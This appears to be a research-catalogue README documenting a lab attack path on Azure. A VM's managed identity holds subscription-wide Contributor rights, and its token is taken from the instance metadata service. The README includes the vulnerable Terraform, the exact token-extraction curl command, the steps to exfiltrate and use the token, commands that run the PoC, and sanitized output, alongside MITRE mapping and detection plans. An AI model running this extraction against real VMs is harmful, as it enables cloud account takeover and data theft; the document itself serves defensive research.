# Path Z1 — VM Managed Identity via IMDS

## Overview

A VM with a System-Assigned **Managed Identity (MI)** granted `Contributor` at *subscription scope* is reachable over SSH. An attacker with a prior foothold (e.g., compromised SSH key, leaked PEM, network-level pivot) can query the Azure Instance Metadata Service (IMDS) from inside the VM, extract a Bearer token scoped to Azure Resource Manager (ARM), and use that token from their own host to perform subscription-wide actions.

This path is the Azure analogue of AWS Path 6 (EC2 Instance Profile Abuse). The core thesis: neither *having a Managed Identity on a VM* nor *granting `Contributor` to that MI* is dangerous in isolation — the combination, paired with reachable SSH, is the vulnerability.

## Attack Flow

```
┌──────────────────────────┐
│ Attacker host            │   Prior foothold (assumed):
│ (with SSH access)        │   • Compromised SSH key
└──────────┬───────────────┘   • OR network-level pivot
           │
           │  (1) SSH to victim VM
           │      ssh azureuser@<vm-ip>
           ▼
┌──────────────────────────┐
│ pathtriage-z1-vm         │   System-Assigned MI:
│ (overprivileged MI)      │   • Contributor at subscription scope
└──────────┬───────────────┘
           │  (2) Query IMDS for MI token:
           │      curl 169.254.169.254/metadata/identity/oauth2/token
           │           ?resource=https://management.azure.com/
           │      -H 'Metadata: true'
           ▼
┌──────────────────────────┐
│ OAuth2 Bearer token      │   Token properties:
│ (ARM-scoped)             │   • Audience: management.azure.com
│                          │   • Lifetime: ~24h
│                          │   • Bound to MI (client_id reflects)
└──────────┬───────────────┘
           │  (3) Exfiltrate token to attacker host
           │  (4) Use Bearer token via ARM API:
           │      Authorization: Bearer <token>
           ▼
┌──────────────────────────┐
│ Subscription-scope       │   → effective Contributor access
│ Contributor access       │     (validated via role assignment query)
└──────────────────────────┘

Defender visibility in Azure Activity Log:
  Caller = MI principal_id  +  arbitrary Microsoft.* operations
  ─── neither the IMDS read (off-box, invisible) nor the ARM call is
      suspicious individually; the divergence is in Caller IP context ───
```

## MITRE ATT&CK Mapping

- **T1552.005** — Unsecured Credentials: Cloud Instance Metadata API (IMDS extraction)
- **T1078.004** — Valid Accounts: Cloud Accounts (downstream use of stolen MI token)
- **T1098** — Account Manipulation (potential follow-on with Contributor scope)

## Prerequisites

- Azure baseline deployed (`environments/baseline_azure/`)
- Z1 scenario deployed (`environments/scenarios/Z1_vm_managed_identity/`)
- Attacker's SSH public key embedded in baseline (defaults to `~/.ssh/id_rsa.pub`)
- VM public IP from scenario output:
  ```bash
  cd environments/scenarios/Z1_vm_managed_identity
  terraform output -raw vm_public_ip
  ```
- Python 3.10+ with `requests` installed: `pip install requests`
- Azure CLI installed (for baseline only; not used at attack time)

## Vulnerable Configuration

The Z1 scenario provisions a VM with an over-broad role assignment on its System-Assigned MI:

```hcl
resource "azurerm_linux_virtual_machine" "victim" {
  # ...
  identity {
    type = "SystemAssigned"
  }
}

# The vulnerability — Contributor granted at SUBSCRIPTION scope to this VM's MI
resource "azurerm_role_assignment" "vm_overprivileged" {
  scope                = "/subscriptions/${var.subscription_id}"
  role_definition_name = "Contributor"
  principal_id         = azurerm_linux_virtual_machine.victim.identity[0].principal_id
}
```

The vulnerability is the **scope, not the role itself**. `Contributor` is a standard Azure built-in role; granting it at a single resource's scope (the VM itself or a tightly-scoped resource group) is routine. Granting it at *subscription scope* to a VM's MI means any compromise of that VM — including a stolen SSH key — yields subscription-wide blast radius for the next ~24 hours per token issuance.

## Attack Steps

1. Establish SSH access to the VM as `azureuser` (prior foothold assumed).
2. From inside the VM, query IMDS for an ARM-scoped Bearer token:
   ```
   curl -H 'Metadata: true' \
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
   ```
3. Parse the JSON response — extract `access_token` and `client_id`.
4. Exfiltrate the token to the attacker's own host.
5. From the attacker's host, call ARM with `Authorization: Bearer <token>` and enumerate subscriptions.
6. Confirm Contributor-level privilege by performing a subscription-scope list action (e.g., list all VMs).
7. Inspect the MI's role assignments to prove the scope.
8. (Out of scope for this PoC) Use the Contributor token to create resources, modify role assignments, exfiltrate other resources' secrets, etc.

## Running the PoC

From the project root:

```bash
cd environments/scenarios/Z1_vm_managed_identity
VM_IP=$(terraform output -raw vm_public_ip)

# Confirm SSH reachability (give VM ~1 min after apply for cloud-init)
ssh -i ~/.ssh/id_rsa -o StrictHostKeyChecking=no azureuser@$VM_IP "echo SSH OK"

# Run the exploit; tee to verification log
cd ../../../attacks/Z1_vm_managed_identity
python3 exploit.py $VM_IP | tee verification_log.raw.txt

# Sanitize before commit (replace real identifiers with placeholders)
sed -E \
  -e 's/<actual-sub-id>/<SUBSCRIPTION_ID>/g' \
  -e 's/<actual-mi-id>/<MI_CLIENT_ID>/g' \
  -e "s/$VM_IP/<VM_PUBLIC_IP>/g" \
  verification_log.raw.txt > verification_log.txt
```

## Captured Output (PoC Verification)

The following is the captured output from running the PoC end-to-end against a freshly deployed lab on 2026-06-29. The full log is committed to this directory as `verification_log.txt` (sanitized); the raw log containing actual subscription and tenant identifiers is retained outside the repository.

```
[*] target VM: <VM_PUBLIC_IP>
[*] acting from external attacker host with SSH access
[*] Step 1: query IMDS for Managed Identity token (ARM-scoped)
[+] token acquired
    client_id (MI):     <MI_CLIENT_ID>
    token length:       2055 chars
    expires_in:         86300s
[*] Step 2: enumerate subscriptions accessible to this token
[+] subscription accessible: Azure for Students (<SUBSCRIPTION_ID>)
[*] Step 3: perform a Contributor-scope action (list all VMs in subscription)
[+] enumerated 1 VM(s) at subscription scope
[*] Step 4: inspect role assignments held by this MI
[+] role assignment: scope=/subscriptions/<SUBSCRIPTION_ID>
                     roleDefinitionId=<CONTRIBUTOR_ROLE_DEFINITION_ID>

[+] Path Z1 verified: VM IMDS -> MI token -> subscription-scope Contributor
```

## Why This Works

- Azure VMs with a Managed Identity automatically host an IMDS endpoint at `169.254.169.254` that issues OAuth2 Bearer tokens to *anything running on the instance* with `Metadata: true` in the request header. There is no equivalent of AWS IMDSv2's session-token requirement in Azure — a single `Metadata: true` header suffices.
- Azure access tokens are **audience-bound** — the `resource` parameter at issuance determines which API the token can call (`management.azure.com` for ARM, `vault.azure.net` for Key Vault, etc.). An attacker requests the audience matching their target operation.
- Token lifetime is approximately **24 hours**, materially longer than AWS STS credentials (~1 hour). Once exfiltrated, a stolen MI token remains valid significantly longer than its AWS counterpart, increasing the post-extraction blast radius.
- The defender sees only `Microsoft.Resources/...` operations with the MI's `principal_id` as `Caller` in Activity Log — neither the IMDS read (which happens entirely on the VM and is invisible to Azure-side logging) nor the subsequent ARM call is suspicious in isolation. The detectable signature is the **Caller IP context divergence** between the VM's network interface and the source IP of the API call.

## Comparison to AWS Analogue

| Dimension | AWS Path 6 (Instance Profile Abuse) | Azure Z1 (VM MI) |
|---|---|---|
| Credential format | STS access key (`ASIA…`) | OAuth2 Bearer token |
| Lifetime | ~1 hour | ~24 hours |
| Metadata endpoint | `169.254.169.254` (IMDSv1 / IMDSv2 with session token) | `169.254.169.254` (single `Metadata: true` header) |
| Token scope | Universal across AWS APIs | Audience-bound (ARM, KV, Storage, etc.) |
| Off-box detection signal | `sourceIPAddress` mismatch in CloudTrail | `Caller` IP mismatch in Activity Log |
| Defender-output convergence | Same primitive as Paths 1, 2 | Same primitive as Z6 (Run Command), Z8 |

The longer token lifetime in Azure (~24h vs ~1h) is the most consequential difference for the per-path exploitability rubric — Azure's `detection_difficulty` term is materially higher because the stolen token remains usable across a full operational day.

## Defender Output (deferred to W8/W9)

Detection and mitigation artefacts are deliberately deferred to W8/W9, where they will be designed once across multiple paths to capture convergence points. The off-box-token-use primitive is expected to cover Z1, Z6 (Run Command), and Z8 (VM-bound storage abuse) — three paths, one detection rule.

Planned artefacts (W8):

- `defender/detection.kql` — Sentinel KQL query joining `AzureActivity` (where `Caller` is a VM MI's `principal_id`) with `AzureNetworkAnalytics_CL` or VM network interface metadata, flagging API calls whose source IP does not match the issuing VM's NIC.
- `defender/mitigation.azure_policy.json` — Azure Policy denying role assignments at subscription scope whose `principalType` is `ServicePrincipal` and whose linked resource is a `Microsoft.Compute/virtualMachines` MI.

## Threat Model Note

Unlike the AWS catalogue, where the attacker is modelled as a low-privileged IAM user with long-term access keys, the Azure catalogue models the attacker as a **compromised user account** already authenticated to Azure CLI (or, in this path, holding the VM's SSH private key). This is because Service Principal creation was blocked at the Azure AD tenant layer under the Azure for Students subscription used for this work. Arguably this is a more realistic threat model — most observed Azure breaches begin with phished or stolen user credentials rather than SP credential leakage. See the Engineering Decision Log for full discussion.

## Lab SKU Note

The Z1 lab defaults to `Standard_D2s_v3`. `Standard_B1s` and `Standard_B2s` were attempted first (for cost efficiency) but unavailable in `australiaeast` under an Azure for Students subscription due to capacity restrictions. For subscriptions with different SKU availability, query gentle SKU enumeration via `az vm list-skus --location <region>` and substitute an available 2-vCPU SKU in `main.tf`.

## Cleanup

```bash
# Tear down the Z1 scenario after PoC completes (keeps the Azure baseline intact for Z2–Z8)
cd environments/scenarios/Z1_vm_managed_identity
terraform destroy -auto-approve

# Tear down the baseline at the end of the entire Azure catalogue work
cd ../../baseline_azure
terraform destroy -auto-approve
```

## Status

- [x] Vulnerable Terraform environment (`environments/scenarios/Z1_vm_managed_identity/`)
- [x] Azure baseline (`environments/baseline_azure/`)
- [x] README documentation
- [x] PoC script (`exploit.py`)
- [x] Verification log (against freshly deployed lab, 2026-06-29) — sanitized
- [x] Defender output (Sentinel KQL detection + Azure Policy mitigation) — **deferred to W8 for cross-path unification (shared primitive with Z6, Z8)**
- [ ] Exploitability rubric score — deferred to W6 calibration session

## Detection

This path is covered by defender-output primitive **01 — IMDS Extraction**.

Detection focuses on: **IMDS-issued credential + off-source use correlation (extended token lifetime)**.

See `attacks/_defender_output/primitives/01_imds_extraction/` for:

- **README.md** — detection rationale and query semantics
- **cloudtrail_lake_query.sql** — the AWS detection query (baseline-aware SQL over CloudTrail Lake)
- **scp_snippet.json** — preventive control (SCP-based restriction)
- **paths.md** — per-path signature details (search for `Z1` for this path's specific detection signature)
- **adversarial_evasion.md** — documented evasion strategies and their residual detection
- **azure_symmetry.md** — AWS↔Azure signal correspondence (the Azure counterpart query design)
- **evaluation.md** — evaluation results

Coverage in the five comparison baseline tools (Cloudsplaining, Prowler, Datadog CloudSIEM, Sigma HQ, CIS AWS Foundations v3.0) is documented in `attacks/_defender_output/methodology/related_work.md`.

## References

- Azure documentation — Instance Metadata Service: https://learn.microsoft.com/en-us/azure/virtual-machines/linux/instance-metadata-service
- Azure documentation — How managed identities for Azure resources work: https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-managed-identities-work-vm
- MITRE ATT&CK for Cloud: https://attack.mitre.org/matrices/enterprise/cloud/
- Karl Fosaaen / NetSPI — Azure Privilege Escalation via Managed Identities: https://www.netspi.com/blog/technical-blog/cloud-pentesting/azure-privilege-escalation-via-managed-identities/
- AWS Path 6 (this catalogue) — Instance Profile Abuse: `../06_ec2_instance_profile_abuse/README.md`